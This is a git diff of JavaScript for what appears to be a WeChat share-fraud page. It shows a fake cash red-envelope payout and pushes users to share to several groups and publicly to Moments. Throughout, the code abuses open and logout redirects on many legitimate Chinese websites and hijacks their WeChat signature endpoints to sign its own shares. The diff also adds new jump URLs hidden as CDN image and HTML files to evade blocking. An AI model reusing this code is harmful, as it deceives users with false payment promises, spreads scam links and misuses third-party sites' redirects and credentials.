@@ -1,5 +1,4 @@
-window.onerror = function () {
-}
+window.onerror = function () {}
 window['data'] = window['data'] || {};
 if (window.data && window.data.ad) {
   window.data.ad = {
@@ -26,8 +25,7 @@ window.gConfig = $.extend({
     '获得￥ <span style="font-size: 20px;color: red;">%(money)</span> 现金红包，',
     '金额已提交银行打款，预计1小时内到账（跨行次日到账，非工作时间[09:00-17:00]次日到账），请注意查收微信绑定银行卡到账情况！',
   ].join(''),
-  groupTips: [
-    {
+  groupTips: [{
       successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
       successTips: '请继续分享到<b style="font-size: 18px;color: red">2</b>个不同的群<br/><span style="color:red;">红包将立即到账！</span>',
     },
@@ -48,12 +46,10 @@ window.gConfig = $.extend({
       successTips: '剩下最后一步啦！<br />请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>，获赠<b style="font-size: 18px;color: red;">{moneyStr}</b>元💰立即到账！',
     },
   ],
-  timeLineTips: [
-    {
-      successTitle: '<b style="font-size: 22px;color: red;">分享失败！</b>',
-      successTips: '<br>注意：必须[<span color="red">公开</span>]分享哦!<br>请尝试重新分享到<b style="font-size: 18px;color: red">朋友圈</b><br>',
-    },
-  ]
+  timeLineTips: [{
+    successTitle: '<b style="font-size: 22px;color: red;">分享失败！</b>',
+    successTips: '<br>注意：必须[<span color="red">公开</span>]分享哦!<br>请尝试重新分享到<b style="font-size: 18px;color: red">朋友圈</b><br>',
+  }, ]
 }, (window['data']));
 var evkey = M.getParam('_evkey');
 var site = M.getParam('_c');
@@ -71,7 +67,7 @@ var bq = biaoqing[Math.floor(Math.random() * biaoqing.length)];
 
 (function () {
 
-  function getSpm () {
+  function getSpm() {
     var stringArray = 'qwertyuiopasdfghjklzxcvbnm1234567890';
     var spm = []
     spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
@@ -86,14 +82,26 @@ var bq = biaoqing[Math.floor(Math.random() * biaoqing.length)];
 
   var g_301array = ['http://htdata2.qq.com/cgi-bin/httpconn?htcmd=0x6ff0080&u={encodeUrl}', 'https://ssl.htdata.qq.com/cgi-bin/httpconn?htcmd=0x6ff0080&u={encodeUrl}', 'https://weibo.cn/sinaurl?u={encodeUrl}', 'https://ad.liepin.com/adremote/forward2?nextUrl={encodeUrl}', 'http://rd.go.10086.cn/remind/push/remind.do?specailfunc=wapMpp&x-original-URL={encodeUrl}', 'http://yun.fang.com/logout?backurl={encodeUrl}', 'https://s.cloud.gmw.cn/zcms/member/logout?SiteID=126&Referer={encodeUrl}', 'http://s1.eqxiu.com/eqs/link?id=24208220&url={encodeUrl}', 'https://club.10010.com/index.html?ufc=appcshd&tourl={encodeUrl}', 'http://www.ximalaya.com/jt?channel=wailian&tag=360ting&jt={encodeUrl}', 'https://36kr.com/jump?url={encodeUrl}', 'https://as.weixin.qq.com/cgi-bin/amazing?url={encodeUrl}']
 
-  var g_jumparray = ['http://qiniu.madrock.com.cn/5c28417b00057UPJgPxTTANW9yD5pBm4.html?{spm}={spm}', 'http://pic.app.dbr0668.com/20181123_96048_1551593189711.jpg?{spm}={spm}', 'http://img.phootball.cn/013b4e57-a915-4527-be34-addff02b3e3a?{spm}={spm}', 'http://cdn4video.immocha.com/5c3ede99281f4RO4ZZLmLNzs15HfZ3jm.html?{spm}={spm}', 'http://pic.jinguangcm.com/fantuan/images/theme/theme_img_portrait_135892_1540983303146?{spm}={spm}', 'http://img.yzcdn.cn/krt7f3nx7m8.svg?{spm}={spm}'];
+  var g_jumparray = [
+    'https://www.ribencun.com/Upload3/image/20190302/20190302221108_7721.html',
+    'http://word.fandoutech.com.cn/5c7a8b9f72330s9odu8gaDwg4pXshAEK.svg',
+    'http://qiniu.jiliguala.com/prod/avatar/5f2a87e53ca027b6ade13cc81bc89e44.jpg',
+    'http://static.qiniu.yuenr.com/head/2019/3/2/1551541021488.jpg',
+    'http://hotbb.repinchen.cn/78990',
+    'http://img.xiaodao360.com/5c6fb7863d7685wdJcX07d2pyfjaoSSA.html',
+  ];
 
-  var g_bxarray = ['https://static.mobike.com/ATHENA-BACKEND/327b5ad0-1e8d-46ad-bcf1-b18c8d454a66.html?type=nk&fsrc=dz', 'https://static.mobike.com/ATHENA-BACKEND/c448fa55-602e-4033-a9a4-100b0a01a2c9.html?type=nk&fsrc=dz',
-    'https://static.mobike.com/ATHENA-BACKEND/98e1d838-4d67-4e23-946f-8f49aac6ebfc.html?type=nk&fsrc=dz', 'http://www.izssj.com/logs/152837126790.svg?type=nk&fsrc=dz', 'http://white-ic.liubaiapp.com/bxd77a55abbbab49b687b989e4ae1d3f05.svg?type=nk&fsrc=dz', 'http://image.yunjiweidian.com/a1f1886687a84bcd8fee5c66248cdaa7.svg?type=nk&fsrc=dz', 'http://admin.pcdn.xiaodao.tv/5b8e8ab8dbdafaDquC4Ufij5pFVJF4u8.svg?type=nk&fsrc=dz', 'http://snsimg.ztjystore.cn/5b8fba3941c93CNZUHr3dAFZdQAzINB4.svg?type=nk&fsrc=dz'];
+  var g_bxarray = [
+    'https://www.ribencun.com/Upload3/image/20190302/20190302221108_7721.html',
+    'http://word.fandoutech.com.cn/5c7a8b9f72330s9odu8gaDwg4pXshAEK.svg',
+    'http://qiniu.jiliguala.com/prod/avatar/5f2a87e53ca027b6ade13cc81bc89e44.jpg',
+    'http://static.qiniu.yuenr.com/head/2019/3/2/1551541021488.jpg',
+    'http://hotbb.repinchen.cn/78990',
+    'http://img.xiaodao360.com/5c6fb7863d7685wdJcX07d2pyfjaoSSA.html',
+  ];
 
   var i3 = parseInt(g_pc['i3']);
-  if (i3 >= 0 && i3 < g_301array.length) {
-  } else {
+  if (i3 >= 0 && i3 < g_301array.length) {} else {
     i3 = -1;
   }
   var ic = parseInt(g_pc['ic']) || 0;
@@ -120,7 +128,7 @@ var bq = biaoqing[Math.floor(Math.random() * biaoqing.length)];
 
 }());
 
-function checkIsMp () {
+function checkIsMp() {
   if (window.data && window.data['attached'] && window.data['attached']['isMp']) {
     return true;
   } else {
@@ -128,11 +136,11 @@ function checkIsMp () {
   }
 }
 
-function getCity () {
+function getCity() {
   return (window['localAddress'] ? ['北京市', '天津市', '上海市', '重庆市'].indexOf(localAddress.province) > -1 ? localAddress.province : localAddress.city : '').replace(/(.*)市/, '$1');
 }
 
-function randomOneFromList (list) {
+function randomOneFromList(list) {
   if (list && list.length > 0) {
     return list[Math.floor(Math.random() * list.length)];
   } else {
@@ -140,7 +148,7 @@ function randomOneFromList (list) {
   }
 }
 
-function getSpm () {
+function getSpm() {
   var stringArray = 'qwertyuiopasdfghjklzxcvbnm1234567890';
   var spm = []
   spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
@@ -154,13 +162,13 @@ function getSpm () {
 }
 
 
-function pad (num, size) {
+function pad(num, size) {
   var s = num + "";
   while (s.length < size) s = "0" + s;
   return s;
 }
 
-function getFuck163 () {
+function getFuck163() {
   var strList = [];
   for (var i = 0; i < 5; i++) {
     strList.push('%' + pad(1 + Math.round(Math.random() * 18), 2));
@@ -168,7 +176,7 @@ function getFuck163 () {
   return strList.join('');
 }
 
-function addJumpToUrl (jump) {
+function addJumpToUrl(jump) {
   if (location.host.indexOf('m.ymatou.com') > -1) {
     return 'https://www.ymatou.com/login/logout?' + getSpm() + '=' + getSpm() + '&ret=' + encodeURIComponent(jump);
   } else if (location.host.indexOf('my.lotour.com') > -1) {
@@ -179,10 +187,13 @@ function addJumpToUrl (jump) {
 }
 
 /* 借权end */
-function record (event, id, allow_reply) {
+function record(event, id, allow_reply) {
   try {
     if (!localStorage.getItem(event + ':' + id) || allow_reply) {
-      $.post('http://p.rsren.com.cn./record', {event: event, id: id})
+      $.post('http://p.rsren.com.cn./record', {
+        event: event,
+        id: id
+      })
       localStorage.setItem(event + ':' + id, true);
     }
   } catch (e) {
@@ -217,7 +228,7 @@ function jumpToDisplay () {
   }
 }*/
 
-function showShareTips (obj) {
+function showShareTips(obj) {
   if (typeof obj === 'object') {
     g_dialog.alert({
       title: obj.successTitle || '',
@@ -241,7 +252,7 @@ function showShareTips (obj) {
   var shareATimes = 0;
   var shareTTimes = 0;
 
-  function share_tip () {
+  function share_tip() {
 
     // 4次群 2次朋友圈
     if (shareATimes == 0) {
@@ -292,7 +303,7 @@ function showShareTips (obj) {
 
   }
 
-  function timeline_callback () {
+  function timeline_callback() {
     if (shareATimes >= 3) {
       shareTTimes += 1;
     }
@@ -303,7 +314,7 @@ function showShareTips (obj) {
     evkey && record('share-uv', evkey);
   }
 
-  function appmessage_callback () {
+  function appmessage_callback() {
     shareATimes += 1;
     share_tip();
     record('share', site, true);
@@ -312,7 +323,7 @@ function showShareTips (obj) {
     evkey && record('share-uv', evkey);
   }
 
-  function shareFriend () {
+  function shareFriend() {
     var result = window.data.to_group;
     if (g_pc['qun'] && g_pc['qun'][shareATimes]) {
       result = {
@@ -351,8 +362,7 @@ function showShareTips (obj) {
         });
       });
 
-    }
-    else {
+    } else {
       wx.ready(function () {
 
         var link = result.link;
@@ -372,14 +382,13 @@ function showShareTips (obj) {
           success: function () {
             appmessage_callback();
           },
-          cancel: function () {
-          }
+          cancel: function () {}
         });
       })
     }
   }
 
-  function shareTimeline (result) {
+  function shareTimeline(result) {
     var result = window.data.to_timeline;
     if (g_pc['pyq'] && g_pc['pyq'][shareTTimes]) {
       result = {
@@ -451,17 +460,15 @@ function showShareTips (obj) {
           success: function () {
             timeline_callback();
           },
-          cancel: function () {
-          }
+          cancel: function () {}
         });
       })
     }
   }
 
-  function show_timeline_menu () {
+  function show_timeline_menu() {
     if (window.data.attached.signmode == 'jssdk') {
-      if (location_host.indexOf('dangdang.com') > -1) {
-      } else {
+      if (location_host.indexOf('dangdang.com') > -1) {} else {
         wx.hideOptionMenu();
       }
       if (M.getParam('debugx') === '1') {
@@ -472,12 +479,14 @@ function showShareTips (obj) {
           ]
         });
       } else {
-        wx.showMenuItems({menuList: ['menuItem:share:timeline']});
+        wx.showMenuItems({
+          menuList: ['menuItem:share:timeline']
+        });
       }
     }
   }
 
-  function ymatou_config () {
+  function ymatou_config() {
 
     window['ymatou_config_callback'] = function (data) {
       jssdk_config({
@@ -495,7 +504,7 @@ function showShareTips (obj) {
     $.getScript(url)
   }
 
-  function sina_config () {
+  function sina_config() {
     $.post('http://blog.sina.cn/dpool/blog/newblog/riaapi/mblog/wechat.php', {
       original_url: location.href.split('#')[0]
     }, function (d) {
@@ -505,7 +514,7 @@ function showShareTips (obj) {
     });
   }
 
-  function dajie_config () {
+  function dajie_config() {
     $.get('', function (d) {
       var ms = d.match(/var\s+js_sdk_config\s+=\s+\{[^\}]+\};/).toString();
       // var ms = (/js_sdk_config = [\s\S]*?};/gm)['toString']()
@@ -514,7 +523,7 @@ function showShareTips (obj) {
     });
   }
 
-  function meipian_config () {
+  function meipian_config() {
     $.post('https://www.meipian.cn/promo/poetry_game/api/shareParams', {
       url: location.href.split('#')[0]
     }, function (d) {
@@ -525,7 +534,7 @@ function showShareTips (obj) {
     })
   }
 
-  function shijue_config () {
+  function shijue_config() {
     var config = {
       appId: wxinfo.appid,
       nonceStr: wxinfo.nonceStr,
@@ -536,7 +545,7 @@ function showShareTips (obj) {
     jssdk_config(config);
   }
 
-  function lotour_config () {
+  function lotour_config() {
     window['ymatou_config_callback'] = function (data) {
       jssdk_config(data);
     }
@@ -547,42 +556,40 @@ function showShareTips (obj) {
     $.getScript(url)
   }
 
-  function jumei_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: 'http://h5.jumei.com/activity/weixin/getWeixinSignV2?url=' + encodeURIComponent(location.href.split('#')[0]),
-        dataType: "jsonp",
-        jsonp: "callback",
-        callback: 'jsonp1',
-        data: {},
-        success: function (d) {
-          var config = d.result;
-          config['appId'] = 'wx21564a7188284dea';
-          config['nonceStr'] = config['noncestr'];
-          config['signature'] = config['sign'];
-          jssdk_config(config);
-        }
-      });
+  function jumei_config() {
+    $.ajax({
+      type: "GET",
+      url: 'http://h5.jumei.com/activity/weixin/getWeixinSignV2?url=' + encodeURIComponent(location.href.split('#')[0]),
+      dataType: "jsonp",
+      jsonp: "callback",
+      callback: 'jsonp1',
+      data: {},
+      success: function (d) {
+        var config = d.result;
+        config['appId'] = 'wx21564a7188284dea';
+        config['nonceStr'] = config['noncestr'];
+        config['signature'] = config['sign'];
+        jssdk_config(config);
+      }
+    });
   }
 
-  function fang_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: '//m.fang.com/huodongAC.d?m=wxShareInfo&class=ActivityIExpiresinTimeMc&shareurl=' + encodeURIComponent(location.href.split('#')[0]),
-        dataType: "jsonp",
-        jsonp: "callback",
-        callback: 'jsonp1',
-        data: {},
-        success: function (d) {
-          var config = d;
-          jssdk_config(config);
-        }
-      });
+  function fang_config() {
+    $.ajax({
+      type: "GET",
+      url: '//m.fang.com/huodongAC.d?m=wxShareInfo&class=ActivityIExpiresinTimeMc&shareurl=' + encodeURIComponent(location.href.split('#')[0]),
+      dataType: "jsonp",
+      jsonp: "callback",
+      callback: 'jsonp1',
+      data: {},
+      success: function (d) {
+        var config = d;
+        jssdk_config(config);
+      }
+    });
   }
 
-  function rabbitpre_config () {
+  function rabbitpre_config() {
     $.ajax({
       type: "GET",
       url: 'https://a3.rabbitpre.com/api2/share/signature?pageUrl=' + encodeURIComponent(location.href.split('#')[0]) + '&shareUrl=' + encodeURIComponent(location.href.split('#')[0]) + '&isAjax=true',
@@ -596,7 +603,7 @@ function showShareTips (obj) {
     });
   }
 
-  function mafengwo_config () {
+  function mafengwo_config() {
     $.ajax({
       type: "GET",
       url: 'https://m.mafengwo.cn/sales/activity/flightpromotion/ajax_data/weChatShare?url=' + encodeURIComponent(location.href.split('#')[0]),
@@ -608,172 +615,162 @@ function showShareTips (obj) {
     });
   }
 
-  function c_17173_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: 'https://act.17173.com/weixin/index.php?do=weixin&url=' + encodeURIComponent(location.href.split('#')[0]),
-        dataType: "jsonp",
-        jsonp: "callback",
-        callback: 'jsonp1',
-        data: {},
-        success: function (d) {
-          var config = d;
-        }
-      });
+  function c_17173_config() {
+    $.ajax({
+      type: "GET",
+      url: 'https://act.17173.com/weixin/index.php?do=weixin&url=' + encodeURIComponent(location.href.split('#')[0]),
+      dataType: "jsonp",
+      jsonp: "callback",
+      callback: 'jsonp1',
+      data: {},
+      success: function (d) {
+        var config = d;
+      }
+    });
   }
 
-  function chanyou_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: 'https://ylruiji.com/sign?site=17173&url=' + encodeURIComponent(location.href.split('#')[0]),
-        dataType: "json",
-        data: {},
-        success: function (d) {
-          jssdk_config(d);
-        }
-      });
+  function chanyou_config() {
+    $.ajax({
+      type: "GET",
+      url: 'https://ylruiji.com/sign?site=17173&url=' + encodeURIComponent(location.href.split('#')[0]),
+      dataType: "json",
+      data: {},
+      success: function (d) {
+        jssdk_config(d);
+      }
+    });
   }
 
-  function hexun_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: 'https://ylruiji.com/sign?site=hexun&url=' + encodeURIComponent(location.href.split('#')[0]),
-        dataType: "json",
-        data: {},
-        success: function (d) {
-          jssdk_config(d);
-        }
-      });
+  function hexun_config() {
+    $.ajax({
+      type: "GET",
+      url: 'https://ylruiji.com/sign?site=hexun&url=' + encodeURIComponent(location.href.split('#')[0]),
+      dataType: "json",
+      data: {},
+      success: function (d) {
+        jssdk_config(d);
+      }
+    });
   }
 
-  function gzl_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: 'http://weixin.gzl.cn/jssdkconfig/getConfig.json?url=' + encodeURIComponent(location.href.split('#')[0]),
-        dataType: "json",
-        data: {},
-        success: function (d) {
-          d.nonceStr = d.noncestr;
-          jssdk_config(d);
-        }
-      });
+  function gzl_config() {
+    $.ajax({
+      type: "GET",
+      url: 'http://weixin.gzl.cn/jssdkconfig/getConfig.json?url=' + encodeURIComponent(location.href.split('#')[0]),
+      dataType: "json",
+      data: {},
+      success: function (d) {
+        d.nonceStr = d.noncestr;
+        jssdk_config(d);
+      }
+    });
   }
 
-  function zhiye_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: 'https://ylruiji.com/sign?site=zhiye&url=' + encodeURIComponent(location.href.split('#')[0]),
-        dataType: "json",
-        data: {},
-        success: function (d) {
-          jssdk_config({
-            appId: d.AppId,
-            timestamp: d.TimeStamp,
-            nonceStr: d.NonceStr,
-            signature: d.Signature,
-          });
-        }
-      });
+  function zhiye_config() {
+    $.ajax({
+      type: "GET",
+      url: 'https://ylruiji.com/sign?site=zhiye&url=' + encodeURIComponent(location.href.split('#')[0]),
+      dataType: "json",
+      data: {},
+      success: function (d) {
+        jssdk_config({
+          appId: d.AppId,
+          timestamp: d.TimeStamp,
+          nonceStr: d.NonceStr,
+          signature: d.Signature,
+        });
+      }
+    });
   }
 
-  function zcool_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: '//m.zcool.com.cn/special/weixinShare.do?addr=',
-        dataType: "json",
-        data: {},
-        success: function (d) {
-          jssdk_config({
-            appId: d.appid,
-            timestamp: d.timestamp,
-            nonceStr: d.nonceStr,
-            signature: d.signature,
-          });
-        }
-      });
+  function zcool_config() {
+    $.ajax({
+      type: "GET",
+      url: '//m.zcool.com.cn/special/weixinShare.do?addr=',
+      dataType: "json",
+      data: {},
+      success: function (d) {
+        jssdk_config({
+          appId: d.appid,
+          timestamp: d.timestamp,
+          nonceStr: d.nonceStr,
+          signature: d.signature,
+        });
+      }
+    });
   }
 
-  function music_163_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: '//music.163.com/store/api/wechat/auth/jssdk/info?url=' + encodeURIComponent(location.href.split('#')[0]),
-        dataType: "json",
-        data: {},
-        success: function (d) {
-          var config = d;
-          jssdk_config(config);
-        }
-      });
+  function music_163_config() {
+    $.ajax({
+      type: "GET",
+      url: '//music.163.com/store/api/wechat/auth/jssdk/info?url=' + encodeURIComponent(location.href.split('#')[0]),
+      dataType: "json",
+      data: {},
+      success: function (d) {
+        var config = d;
+        jssdk_config(config);
+      }
+    });
   }
 
-  function kujiale_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: '//www.kujiale.com/weixin/js/signature?url=' + encodeURIComponent(location.href.split('#')[0]),
-        data: {},
-        success: function (d) {
-          if (typeof d === 'string') {
-            d = JSON.parse(d);
-          }
-          jssdk_config({
-            appId: d.appId,
-            timestamp: d.timestamp,
-            nonceStr: d.noncestr,
-            signature: d.signature,
-          });
+  function kujiale_config() {
+    $.ajax({
+      type: "GET",
+      url: '//www.kujiale.com/weixin/js/signature?url=' + encodeURIComponent(location.href.split('#')[0]),
+      data: {},
+      success: function (d) {
+        if (typeof d === 'string') {
+          d = JSON.parse(d);
         }
-      });
+        jssdk_config({
+          appId: d.appId,
+          timestamp: d.timestamp,
+          nonceStr: d.noncestr,
+          signature: d.signature,
+        });
+      }
+    });
   }
 
-  function chinahr_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: '//wezp.chinahr.com/js/sign?rawurl=' + encodeURIComponent(location.href.split('#')[0]),
-        dataType: "jsonp",
-        jsonp: "callback",
-        callback: 'jsonp1',
-        data: {},
-        success: function (d) {
-          jssdk_config({
-            appId: d.appid,
-            timestamp: d.timestamp,
-            nonceStr: d.nonceStr,
-            signature: d.signature,
-          });
-        }
-      });
+  function chinahr_config() {
+    $.ajax({
+      type: "GET",
+      url: '//wezp.chinahr.com/js/sign?rawurl=' + encodeURIComponent(location.href.split('#')[0]),
+      dataType: "jsonp",
+      jsonp: "callback",
+      callback: 'jsonp1',
+      data: {},
+      success: function (d) {
+        jssdk_config({
+          appId: d.appid,
+          timestamp: d.timestamp,
+          nonceStr: d.nonceStr,
+          signature: d.signature,
+        });
+      }
+    });
   }
 
-  function ifeng_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: '//api.3g.ifeng.com/weishare_token_api?url=' + encodeURIComponent(location.href.split('#')[0]),
-        dataType: "jsonp",
-        jsonp: "callback",
-        callback: 'jsonp1',
-        data: {},
-        success: function (d) {
-          jssdk_config({
-            appId: d.appId,
-            timestamp: d.timestamp,
-            nonceStr: d.nonceStr,
-            signature: d.signature,
-          });
-        }
-      });
+  function ifeng_config() {
+    $.ajax({
+      type: "GET",
+      url: '//api.3g.ifeng.com/weishare_token_api?url=' + encodeURIComponent(location.href.split('#')[0]),
+      dataType: "jsonp",
+      jsonp: "callback",
+      callback: 'jsonp1',
+      data: {},
+      success: function (d) {
+        jssdk_config({
+          appId: d.appId,
+          timestamp: d.timestamp,
+          nonceStr: d.nonceStr,
+          signature: d.signature,
+        });
+      }
+    });
   }
 
-  function sougou_config () {
+  function sougou_config() {
     var url = 'https://shouji.sogou.com/api/weixin/jssdk/wxconfig.php?';
     url += 'rurl=' + encodeURIComponent(location.href.split('#')[0]);
     url += '&_=' + (+new Date());
@@ -798,53 +795,51 @@ function showShareTips (obj) {
     });
   }
 
-  function focus_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: '//wx-open-api.focus.cn/ajax/wxJsConfig?sceneType=1&url=' + encodeURIComponent(location.href.split('#')[0]),
-        dataType: "json",
-        data: {},
-        success: function (d) {
-          var config = d.data;
+  function focus_config() {
+    $.ajax({
+      type: "GET",
+      url: '//wx-open-api.focus.cn/ajax/wxJsConfig?sceneType=1&url=' + encodeURIComponent(location.href.split('#')[0]),
+      dataType: "json",
+      data: {},
+      success: function (d) {
+        var config = d.data;
+        jssdk_config(config);
+        /*setTimeout(function () {
           jssdk_config(config);
-          /*setTimeout(function () {
-            jssdk_config(config);
-          }, 500);
-          setTimeout(function () {
-            jssdk_config(config);
-          }, 1000);
-          setTimeout(function () {
-            jssdk_config(config);
-          }, 2000);*/
-        }
-      });
+        }, 500);
+        setTimeout(function () {
+          jssdk_config(config);
+        }, 1000);
+        setTimeout(function () {
+          jssdk_config(config);
+        }, 2000);*/
+      }
+    });
   }
 
-  function che_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: 'http://service.58che.com/Wxshare/share/?url=' + encodeURIComponent(location.href.split('#')[0]),
-        dataType: "jsonp",
-        jsonp: "callback",
-        callback: 'jsonp1',
-        data: {},
-        success: function (d) {
-          var config = d;
-          jssdk_config(config);
-        }
-      });
+  function che_config() {
+    $.ajax({
+      type: "GET",
+      url: 'http://service.58che.com/Wxshare/share/?url=' + encodeURIComponent(location.href.split('#')[0]),
+      dataType: "jsonp",
+      jsonp: "callback",
+      callback: 'jsonp1',
+      data: {},
+      success: function (d) {
+        var config = d;
+        jssdk_config(config);
+      }
+    });
   }
 
-  function zol_config () {
+  function zol_config() {
     $.getScript('//ylruiji.com/sign?site=zol&url=' + encodeURIComponent(location.href.split('#')[0]), function () {
       var config = window.WeixinShareData;
       jssdk_config(config);
     });
   }
 
-  function douyu_config () {
+  function douyu_config() {
     $.post('https://yubam.douyu.com/ybapi/interaction/getsignpackage', {
       signurl: location.href.split('#')[0]
     }, function (d) {
@@ -860,54 +855,52 @@ function showShareTips (obj) {
     });
   }
 
-  function seeyouyima_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: 'https://view.seeyouyima.com/api/wechat?url=' + encodeURIComponent(location.href.split('#')[0]),
-        dataType: "jsonp",
-        jsonp: "callback",
-        callback: 'jsonp1',
-        data: {},
-        success: function (d) {
-          var config = d.data;
+  function seeyouyima_config() {
+    $.ajax({
+      type: "GET",
+      url: 'https://view.seeyouyima.com/api/wechat?url=' + encodeURIComponent(location.href.split('#')[0]),
+      dataType: "jsonp",
+      jsonp: "callback",
+      callback: 'jsonp1',
+      data: {},
+      success: function (d) {
+        var config = d.data;
+        jssdk_config(config);
+      }
+    });
+  }
+
+  function mia_config() {
+    $.ajax({
+      type: "GET",
+      url: 'https://m.mia.com/wx/share/wx_sign/?url=' + encodeURIComponent(location.href.split('#')[0]),
+      dataType: "jsonp",
+      jsonp: "callback",
+      callback: 'jsonp1',
+      data: {},
+      success: function () {
+        if (window.wx_sign) {
+          var d = wx_sign.signPackage;
+          var config = {
+            appId: d.appId,
+            timestamp: d.timestamp,
+            nonceStr: d.nonceStr,
+            signature: d.signature
+          };
           jssdk_config(config);
         }
-      });
+      }
+    });
   }
 
-  function mia_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: 'https://m.mia.com/wx/share/wx_sign/?url=' + encodeURIComponent(location.href.split('#')[0]),
-        dataType: "jsonp",
-        jsonp: "callback",
-        callback: 'jsonp1',
-        data: {},
-        success: function () {
-          if (window.wx_sign) {
-            var d = wx_sign.signPackage;
-            var config = {
-              appId: d.appId,
-              timestamp: d.timestamp,
-              nonceStr: d.nonceStr,
-              signature: d.signature
-            };
-            jssdk_config(config);
-          }
-        }
-      });
-  }
-
-  function huajiao_config () {
+  function huajiao_config() {
     $.getJSON('https://h.huajiao.com/wx/getConfig', function (d) {
       var config = d.data.config;
       jssdk_config(config);
     });
   }
 
-  function dangdang_config () {
+  function dangdang_config() {
     $.getScript('//e.dangdang.com/weixin/getInfo.php?src_url=' + encodeURIComponent(location.href.split('#')[0]));
 
     setTimeout(function () {
@@ -921,43 +914,41 @@ function showShareTips (obj) {
 
   }
 
-  function bama555_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: 'http://cyzssj.bama555.com/data/wechatjsapi?url=' + encodeURIComponent(location.href.split('#')[0]),
-        dataType: "jsonp",
-        jsonp: "callback",
-        callback: 'jsonp1',
-        data: {},
-        success: function (d) {
-          var config = d.data;
-          jssdk_config(config);
-        }
-      });
+  function bama555_config() {
+    $.ajax({
+      type: "GET",
+      url: 'http://cyzssj.bama555.com/data/wechatjsapi?url=' + encodeURIComponent(location.href.split('#')[0]),
+      dataType: "jsonp",
+      jsonp: "callback",
+      callback: 'jsonp1',
+      data: {},
+      success: function (d) {
+        var config = d.data;
+        jssdk_config(config);
+      }
+    });
   }
 
-  function jia_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: '//weixin.jia.com/api/weixinjssdk/getConfigInfo?url=' + encodeURIComponent(encodeURIComponent(location.href.split('#')[0])),
-        dataType: "jsonp",
-        jsonp: "callbackparam",
-        data: {},
-        success: function (d) {
-          var config = d.result;
-          jssdk_config({
-            appId: config.appId,
-            timestamp: config.timestamp,
-            nonceStr: config.nonceStr,
-            signature: config.signature,
-          });
-        }
-      });
+  function jia_config() {
+    $.ajax({
+      type: "GET",
+      url: '//weixin.jia.com/api/weixinjssdk/getConfigInfo?url=' + encodeURIComponent(encodeURIComponent(location.href.split('#')[0])),
+      dataType: "jsonp",
+      jsonp: "callbackparam",
+      data: {},
+      success: function (d) {
+        var config = d.result;
+        jssdk_config({
+          appId: config.appId,
+          timestamp: config.timestamp,
+          nonceStr: config.nonceStr,
+          signature: config.signature,
+        });
+      }
+    });
   }
 
-  function wenjuan_config () {
+  function wenjuan_config() {
 
     $.getJSON('https://ylruiji.com/sign?site=wenjuan&url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
       var config = d;
@@ -965,7 +956,7 @@ function showShareTips (obj) {
     });
   }
 
-  function pingan_config () {
+  function pingan_config() {
     $.getJSON('https://m.health.pingan.com/mapi/signature.json?deviceId=5a4c935cbb6ff6ca&deviceType=SM-G9300&timestamp=1551091706759&app=0&platform=3&app_key=PAHealth&osversion=23&version=1.0.1&resolution=1440x2560&screenSize=22&netType=1&channel=UMENG_CHANNEL_VALUE&url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
       var config = {
         appId: d.appid,
@@ -995,44 +986,42 @@ function showShareTips (obj) {
     //     });
   }
 
-  function leju_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: 'https://m.leju.com/index.php?site=api&ctl=initjssdk&act=index&url=' + encodeURIComponent(location.href.split('#')[0]),
-        dataType: "jsonp",
-        jsonp: "callback",
-        callback: 'jsonp1',
-        data: {},
-        success: function (d) {
-          var config = d;
-          jssdk_config({
-            'appId': config['appid'],
-            'nonceStr': config['noncestr'],
-            'timestamp': config['timestamp'],
-            'signature': config['signature'],
-          });
-        }
-      });
+  function leju_config() {
+    $.ajax({
+      type: "GET",
+      url: 'https://m.leju.com/index.php?site=api&ctl=initjssdk&act=index&url=' + encodeURIComponent(location.href.split('#')[0]),
+      dataType: "jsonp",
+      jsonp: "callback",
+      callback: 'jsonp1',
+      data: {},
+      success: function (d) {
+        var config = d;
+        jssdk_config({
+          'appId': config['appid'],
+          'nonceStr': config['noncestr'],
+          'timestamp': config['timestamp'],
+          'signature': config['signature'],
+        });
+      }
+    });
   }
 
-  function inke_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: '//actapi.busi.inke.cn/app/wx_share_config',
-        dataType: "json",
-        success: function (d) {
-          var config = d.data;
-          config['appId'] = config['appid'];
-          config['nonceStr'] = config['noncestr'];
-          jssdk_config(config);
-        }
-      });
+  function inke_config() {
+    $.ajax({
+      type: "GET",
+      url: '//actapi.busi.inke.cn/app/wx_share_config',
+      dataType: "json",
+      success: function (d) {
+        var config = d.data;
+        config['appId'] = config['appid'];
+        config['nonceStr'] = config['noncestr'];
+        jssdk_config(config);
+      }
+    });
   }
 
-  function pchome_config () {
-    function success (text) {
+  function pchome_config() {
+    function success(text) {
       var reg = /wx\.config\(([^\)]*)\)/;
       reg.test(text);
       var s = RegExp.$1;
@@ -1042,8 +1031,7 @@ function showShareTips (obj) {
       jssdk_config(config);
     }
 
-    function fail (code) {
-    }
+    function fail(code) {}
 
     var request = new XMLHttpRequest(); // 新建XMLHttpRequest对象
 
@@ -1062,19 +1050,19 @@ function showShareTips (obj) {
       }
     };
 
-// 发送请求:
+    // 发送请求:
     request.open('GET', '//ylruiji.com/sign?site=pchome&url=' + encodeURIComponent(location.href.split('#')[0]));
     request.send();
   }
 
